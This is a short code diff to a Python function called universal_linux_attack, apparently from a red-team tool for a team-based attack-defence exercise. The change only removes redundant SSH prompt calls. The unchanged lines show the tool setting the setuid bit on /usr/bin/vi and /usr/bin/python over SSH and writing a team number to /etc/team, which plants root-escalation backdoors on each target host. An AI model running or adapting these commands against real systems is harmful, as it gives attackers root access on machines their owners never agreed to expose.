@@ -150,7 +150,6 @@ def universal_linux_attack(host):
     
     # setuid on vi
     setuid_vi_cmd = "chmod u+s /usr/bin/vi"
-    ssh.prompt()
     log_line("Turning on setuid bit for /usr/bin/vi on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(setuid_vi_cmd)
     ssh.prompt()
@@ -158,7 +157,6 @@ def universal_linux_attack(host):
     
     # setuid on python
     setuid_vi_cmd = "chmod u+s /usr/bin/python"
-    ssh.prompt()
     log_line("Turning on setuid bit for /usr/bin/python on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(setuid_vi_cmd)
     ssh.prompt()
@@ -166,7 +164,6 @@ def universal_linux_attack(host):
 
     ## Mark team numbers
     mark_team_cmd = "echo -n {} > /etc/team".format(host.team)
-    ssh.prompt()
     log_line("Logging team number for host on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(mark_team_cmd)
     ssh.prompt()
